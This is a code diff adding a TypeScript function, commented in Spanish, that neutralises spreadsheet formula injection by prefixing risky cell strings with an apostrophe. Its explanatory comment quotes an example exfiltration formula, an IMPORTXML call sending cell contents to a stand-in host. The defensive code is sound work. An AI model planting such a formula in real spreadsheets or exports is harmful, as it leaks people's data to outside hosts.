@@ -45,6 +45,21 @@ export function num(v: string | number | null | undefined): number {
   return isNaN(n) ? 0 : n;
 }
 
+// Evita la "inyección de fórmulas" en hojas de cálculo (Google Sheets y Excel): un
+// TEXTO que empiece por = + - @ (o tabulador/retorno) puede convertirse en fórmula
+// viva capaz de leer celdas vecinas y filtrarlas (p. ej. =IMPORTXML("http://malo?d="
+// & CONCAT(A2:M2), "//a")). Se le antepone un apóstrofo para forzar que la hoja lo
+// trate como texto; en Google Sheets el apóstrofo ni se muestra. Solo afecta a cadenas
+// peligrosas: los números y las cadenas puramente numéricas (incluidos los negativos,
+// p. ej. "-500") se dejan intactos para que sigan siendo números de verdad.
+const INICIO_FORMULA = /^[=+\-@\t\r\n]/;
+const NUMERO_PLANO = /^[+-]?\d+(?:[.,]\d+)?$/;
+export function sanearCeldaHoja(v: string | number): string | number {
+  if (typeof v !== 'string' || v === '') return v;
+  if (INICIO_FORMULA.test(v) && !NUMERO_PLANO.test(v)) return `'${v}`;
+  return v;
+}
+
 // Colombia usa UTC-5 todo el año (no tiene horario de verano). Se centraliza aquí
 // para que el "día" del sistema cambie a la medianoche de Colombia y no a la del
 // servidor (que en producción —p. ej. Vercel— suele ser UTC). Así los códigos de
